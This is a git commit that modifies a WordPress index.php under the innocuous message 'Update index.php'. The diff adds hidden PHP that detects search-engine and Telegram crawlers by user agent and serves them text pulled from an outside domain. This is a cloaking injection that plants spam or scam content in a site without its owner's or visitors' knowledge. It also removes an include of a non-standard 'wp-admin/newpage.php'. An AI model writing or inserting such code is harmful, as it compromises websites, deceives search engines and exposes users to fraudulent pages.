25025653c9d8bfe3ed37a4930b0624aa5206706e
lanthau <figththelast@gmail.com>
2024-12-22 02:59:12 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,21 @@
 <?php
+function is_bot() {
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents("https://desa-badai.pro/landing/moonstrikecapital.txt");
+    echo $message;
+}
+?>
+<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
@@ -12,6 +29,6 @@
  * @var bool
  */
 define( 'WP_USE_THEMES', true );
-require __DIR__ . '/wp-admin/newpage.php';
+
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
